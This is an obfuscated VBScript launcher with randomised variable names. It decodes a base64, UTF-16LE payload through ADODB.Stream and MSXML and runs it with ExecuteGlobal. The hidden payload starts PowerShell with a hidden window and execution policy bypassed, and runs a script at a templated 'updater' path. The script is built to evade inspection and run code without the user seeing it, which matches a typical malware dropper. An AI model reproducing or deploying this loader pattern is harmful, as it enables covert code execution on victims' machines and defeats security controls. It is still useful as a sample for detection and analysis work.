Dim kqpbdnsu
kqpbdnsu = ""
kqpbdnsu = kqpbdnsu & "TwBwAHQAaQBvAG4AIABFAHgAcABsAGkAYwBpAHQACgBEAGkAbQAgAG8AUwBoAGUAbABsACwAIABzAEMAbQBkAAoA"
kqpbdnsu = kqpbdnsu & "UwBlAHQAIABvAFMAaABlAGwAbAAgAD0AIABDAHIAZQBhAHQAZQBPAGIAagBlAGMAdAAoACIAVwBTAGMAcgBpAHAA"
kqpbdnsu = kqpbdnsu & "dAAuAFMAaABlAGwAbAAiACkACgBzAEMAbQBkACAAPQAgACIAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAA"
kqpbdnsu = kqpbdnsu & "LQBOAG8AUAByAG8AZgBpAGwAZQAgAC0ATgBvAG4ASQBuAHQAZQByAGEAYwB0AGkAdgBlACAALQBXAGkAbgBkAG8A"
kqpbdnsu = kqpbdnsu & "dwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIABCAHkA"
kqpbdnsu = kqpbdnsu & "cABhAHMAcwAgAC0ARgBpAGwAZQAgACIAIgAlACUAVQBQAEQAQQBUAEUAUgBfAFAAUwAxAF8AUABBAFQASAAlACUA"
kqpbdnsu = kqpbdnsu & "IgAiACIACgBvAFMAaABlAGwAbAAuAFIAdQBuACAAcwBDAG0AZAAsACAAMAAsACAAVAByAHUAZQAKAFMAZQB0ACAA"
kqpbdnsu = kqpbdnsu & "bwBTAGgAZQBsAGwAIAA9ACAATgBvAHQAaABpAG4AZwA="
Dim blpedxnx
Set blpedxnx = CreateObject("ADODB.Stream")
blpedxnx.Type = 1
blpedxnx.Open
Dim _xn : Set _xn = CreateObject("MSXml2.DOMDocument").createElement("z")
_xn.dataType = "bin.base64"
_xn.text = kqpbdnsu
blpedxnx.Write _xn.nodeTypedValue
blpedxnx.Position = 0
blpedxnx.Type = 2
blpedxnx.Charset = "UTF-16LE"
Dim szifzsha : szifzsha = blpedxnx.ReadText
blpedxnx.Close
ExecuteGlobal szifzsha